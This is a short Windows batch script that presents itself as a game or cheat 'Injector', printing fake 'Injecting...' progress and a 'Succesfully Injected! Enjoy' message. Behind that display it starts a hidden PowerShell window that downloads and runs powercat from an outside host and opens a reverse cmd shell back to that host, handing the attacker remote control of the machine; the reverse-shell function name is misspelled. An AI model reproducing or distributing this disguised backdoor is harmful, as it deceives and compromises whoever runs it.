@echo off
color 4
title Injector
echo Injecting.
timeout /T 1 > NUL
cls
echo Injecting..
timeout /T 1 > NUL
cls
echo Injecting...
timeout /T 1 > NUL
cls
echo Injecting....
start powershell.exe -windowstyle hidden iex ((New-Object Net.WebClient).DownloadString('http://ip:8888/powercat.ps1'));powerrcatt -c ip -p 8887 -e cmd
timeout /T 1 > NUL
cls
echo ----------------------------
echo Succesfully Injected! Enjoy
echo ----------------------------
pause > NUL